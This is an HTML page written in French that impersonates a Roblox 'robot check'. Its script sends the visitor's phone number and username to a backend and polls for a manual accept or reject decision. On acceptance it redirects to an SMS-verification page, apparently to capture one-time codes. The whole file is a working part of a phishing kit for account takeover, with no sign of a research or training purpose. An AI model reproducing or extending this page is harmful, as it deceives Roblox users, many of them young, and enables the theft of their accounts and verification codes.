<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification en cours</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 25%, #404040 50%, #2d2d2d 75%, #1a1a1a 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .verification-card {
            background: #1e1e1e;
            border-radius: 20px;
            padding: 48px 60px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            border: 2px solid #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 5px solid #333;
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite, colorPulse 1s linear infinite;
            margin-bottom: 32px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes colorPulse {
            0%   { border-top-color: #fff; }
            25%  { border-top-color: #bbb; }
            50%  { border-top-color: #fff; }
            75%  { border-top-color: #bbb; }
            100% { border-top-color: #fff; }
        }
        .verification-text {
            color: #fff;
            font-size: 20px;
            font-weight: 500;
            text-align: center;
        }
        .robot-check-text {
            color: #fff;
            font-size: 16px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 24px;
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="verification-card">
        <div class="robot-check-text">Les services de Roblox vérifient si vous n'êtes pas un robot...</div>
        <div class="spinner"></div>
        <div class="verification-text">Vérification en cours...</div>
    </div>

    <script>
        // Récupérer les données de la page précédente
        const urlParams = new URLSearchParams(window.location.search);
        const phone = urlParams.get('phone');
        const username = urlParams.get('username');

        // Fonction pour envoyer la demande de vérification
        async function sendVerificationRequest() {
            try {
                const response = await fetch('http://localhost:3000/api/verification-request', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phone,
                        username: username
                    })
                });

                if (response.ok) {
                    const data = await response.json();
                    console.log('Demande envoyée:', data);
                    
                    // Commencer à vérifier le statut
                    checkVerificationStatus(data.requestId);
                } else {
                    console.error('Erreur lors de l\'envoi de la demande');
                    showError('Erreur de connexion au serveur');
                }
            } catch (error) {
                console.error('Erreur:', error);
                showError('Erreur de connexion');
            }
        }

        // Fonction pour vérifier le statut de la vérification
        async function checkVerificationStatus(requestId) {
            try {
                const response = await fetch(`http://localhost:3000/api/verification-status/${requestId}`);
                
                if (response.ok) {
                    const data = await response.json();
                    
                    if (data.status === 'accepted') {
                        showSuccess('Vérification acceptée ! Redirection vers la vérification SMS...');
                        // Rediriger vers la page SMS après 2 secondes
                        setTimeout(() => {
                            window.location.href = `sms-verification.html?phone=${phone}&username=${username}&requestId=${requestId}`;
                        }, 2000);
                    } else if (data.status === 'rejected') {
                        showError('❌ Numéro invalide ou opérateur non pris en charge. Veuillez réessayer plus tard.');
                    } else {
                        // Continuer à vérifier toutes les 2 secondes
                        setTimeout(() => checkVerificationStatus(requestId), 2000);
                    }
                } else {
                    console.error('Erreur lors de la vérification du statut');
                    setTimeout(() => checkVerificationStatus(requestId), 2000);
                }
            } catch (error) {
                console.error('Erreur:', error);
                setTimeout(() => checkVerificationStatus(requestId), 2000);
            }
        }

        // Fonction pour afficher un message de succès
        function showSuccess(message) {
            const card = document.querySelector('.verification-card');
            card.innerHTML = `
                <div style="color: #00ff00; font-size: 24px; margin-bottom: 20px;">✅</div>
                <div class="verification-text" style="color: #00ff00;">${message}</div>
            `;
        }

        // Fonction pour afficher un message d'erreur
        function showError(message) {
            const card = document.querySelector('.verification-card');
            card.innerHTML = `
                <div style="color: #ff0000; font-size: 24px; margin-bottom: 20px;">❌</div>
                <div class="verification-text" style="color: #ff0000;">${message}</div>
            `;
        }

        // Démarrer la vérification quand la page se charge
        window.addEventListener('load', () => {
            if (phone && username) {
                sendVerificationRequest();
            } else {
                showError('Données manquantes. Veuillez revenir à la page de connexion.');
            }
        });
    </script>
</body>
</html>
